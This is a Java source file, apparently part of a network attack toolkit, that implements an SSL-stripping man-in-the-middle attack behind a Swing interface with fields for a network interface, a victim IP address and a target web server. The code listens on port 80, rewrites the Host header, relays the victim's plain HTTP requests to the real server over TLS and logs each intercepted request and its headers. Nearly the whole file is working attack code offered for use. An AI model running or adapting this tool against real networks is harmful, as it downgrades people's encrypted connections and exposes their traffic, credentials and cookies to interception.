package emma.ssl;

import emma.*;
import org.pcap4j.core.*;
import org.pcap4j.packet.DnsPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.TcpPacket;
import org.pcap4j.packet.UdpPacket;

import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.swing.*;
import javax.swing.text.PlainDocument;
import java.io.IOException;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.function.Function;

public class SSLStripingAttackHandler implements AttackHandler {

    private static final DateFormat TIMESTAMP_FORMAT = new SimpleDateFormat("[HH:mm:ss]");

    private JComboBox<ComboBoxEntryWrapper<PcapNetworkInterface>> interfaceDropdown;
    private JTextField dnsField, victimIpField;
    private JButton startButton, stopButton;
    private JTextArea outputField;

    private List<PcapNetworkInterface> allNetworkInterfaces;
    private PcapNetworkInterface networkInterface;
    private InetAddress victimIp;
    private String dns;

    private boolean isIntercepting = false;

    private ServerSocket serverSocket;
    private SSLSocketFactory sslSocketFactory;

    @Override
    public void initialize() {
        this.allNetworkInterfaces = NetworkUtils.gatherNetworkInterfaces();
    }

    @Override
    public void initializeWindow(JFrame frame) {
        sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();
        // Set the window size
        frame.setSize(875, 320);

        // Interface dropdown
        JLabel interfaceDropdownLabel = new JLabel("Network interface:");
        interfaceDropdownLabel.setBounds(10, 10, 150, 15);
        frame.add(interfaceDropdownLabel);
        this.interfaceDropdown = new JComboBox<>();
        this.interfaceDropdown.setBounds(10, 25, 310, 30);
        this.interfaceDropdown.setEditable(false);
        Function<PcapNetworkInterface,String> formatter = networkInterface -> networkInterface.getDescription() + " (" + networkInterface.getName() + ")";
        this.allNetworkInterfaces.stream().map(networkInterface -> new ComboBoxEntryWrapper<>(networkInterface, formatter)).forEach(this.interfaceDropdown::addItem);
        //noinspection unchecked
        this.interfaceDropdown.addItemListener(event -> this.selectInterface(((ComboBoxEntryWrapper<PcapNetworkInterface>)event.getItem()).getObject()));
        frame.add(this.interfaceDropdown);

        // Spoof ip-address
        JLabel victimIpLabel = new JLabel("Victim ip-address:");
        victimIpLabel.setBounds(10, 75, 300, 15);
        frame.add(victimIpLabel);
        this.victimIpField = new JTextField(20);
        this.victimIpField.setBounds(10, 90, 300, 30);
        this.victimIpField.getDocument().addDocumentListener(new DocumentChangeListener(() -> this.updateVictimIp(this.victimIpField.getText())));
        ((PlainDocument)this.victimIpField.getDocument()).setDocumentFilter(new RegexDocumentFilter("[a-zA-Z0-9.]*"));
        frame.add(this.victimIpField);

        // Spoof ip-address
        JLabel dnsLabel = new JLabel("DNS Web-Server:");
        dnsLabel.setBounds(10, 150, 300, 15);
        frame.add(dnsLabel);
        this.dnsField = new JTextField(20);
        this.dnsField.setBounds(10, 165, 300, 30);
        this.dnsField.getDocument().addDocumentListener(new DocumentChangeListener(() -> this.updateDNS(this.dnsField.getText())));
        frame.add(this.dnsField);

        // Start sending button
        this.startButton = new JButton("Start intercepting");
        this.startButton.setBounds(10, 240, 150, 30);
        this.startButton.addActionListener(action -> this.startIntercepting());
        this.startButton.setEnabled(false);
        frame.add(this.startButton);

        // Stop sending button
        this.stopButton = new JButton("Stop intercepting");
        this.stopButton.setBounds(170, 240, 150, 30);
        this.stopButton.addActionListener(action -> this.stopIntercepting());
        this.stopButton.setEnabled(false);
        frame.add(this.stopButton);

        // Output field
        this.outputField = new JTextArea();
        this.outputField.setEditable(false);
        this.outputField.setLineWrap(true);
        JScrollPane outputScrollPane = new JScrollPane(this.outputField);
        outputScrollPane.setBounds(350, 10, 500, 260);
        outputScrollPane.setBorder(null);
        outputScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        frame.add(outputScrollPane);

        this.selectInterface(this.interfaceDropdown.getSelectedIndex() >= 0 ? ((ComboBoxEntryWrapper<PcapNetworkInterface>)this.interfaceDropdown.getSelectedItem()).getObject() : null);
    }

    @Override
    public void shutdown() {

    }

    private void selectInterface(PcapNetworkInterface networkInterface) {
        this.networkInterface = networkInterface;

        // Update the buttons
        this.checkAllFields();
    }

    private void updateVictimIp(String victimIp){
        if(victimIp.isEmpty()){
            // Return if the address is empty
            this.victimIp = null;
        }else{
            // Try to parse the address
            try{
                this.victimIp = InetAddress.getByName(victimIp);
            }catch(UnknownHostException e){
                this.victimIp = null;
            }
        }

        // Update the buttons
        this.checkAllFields();
    }

    private void updateDNS(String dns) {
        if (dns.isEmpty()) {
            this.dns = null;
        } else {
            this.dns = dns;
        }

        // Update the buttons
        this.checkAllFields();
    }

    private void checkAllFields(){
        // Check if all fields are filled
        boolean allValid = this.networkInterface != null && this.victimIp != null && dns != null;
        // Update the buttons
        this.startButton.setEnabled(allValid);
    }

    private void startIntercepting() {
        if(this.isIntercepting){
            Main.displayError("Program is already intercepting HTTP requests!");
            return;
        }
        this.isIntercepting = true;

        this.interfaceDropdown.setEnabled(false);
        this.startButton.setEnabled(false);
        this.victimIpField.setEnabled(false);
        this.dnsField.setEnabled(false);
        this.stopButton.setEnabled(true);

        try {
            serverSocket = new ServerSocket(80);
        } catch (IOException e) {

        }

        System.out.println("Starting serversocket.");

        new Thread(() -> {
            while (this.isIntercepting) {
                Socket clientSocket = null;
                SSLSocket sslSocket = null;
                try {
                    clientSocket = serverSocket.accept();

                    HttpRequest request = new HttpRequest(clientSocket.getInputStream());
                    request.customHeaders.remove("Host");
                    request.customHeaders.add("Host", dnsField.getText());

                    logMessage("Incoming Request: " + request.toString());
                    logMessage(request.headersToString());

                    sslSocket = (SSLSocket) sslSocketFactory.createSocket(dnsField.getText(), 443);

                    request.writeTo(sslSocket.getOutputStream());

                    sslSocket.getInputStream().transferTo(clientSocket.getOutputStream());

                    clientSocket.getOutputStream().flush();
                    clientSocket.close();
                    sslSocket.close();
                } catch (Exception e) {
                    if (sslSocket != null) {
                        try {
                            sslSocket.close();
                        } catch (IOException ex) {

                        }
                    }

                    if (clientSocket != null) {
                        try {
                            clientSocket.close();
                        } catch (IOException ex) {

                        }
                    }
                    continue;
                }
            }
        }).start();
    }

    private void stopIntercepting() {
        if(!this.isIntercepting){
            Main.displayError("Program is not currently intercepting HTTP requests!");
            return;
        }
        this.isIntercepting = false;

        this.interfaceDropdown.setEnabled(true);
        this.startButton.setEnabled(true);
        this.victimIpField.setEnabled(true);
        this.dnsField.setEnabled(true);
        this.stopButton.setEnabled(false);

        try {
            serverSocket.close();
        } catch (IOException e) {

        }
    }

    private void logMessage(String message){
        this.outputField.append(message + "\n");
        System.out.println(message);
    }
}
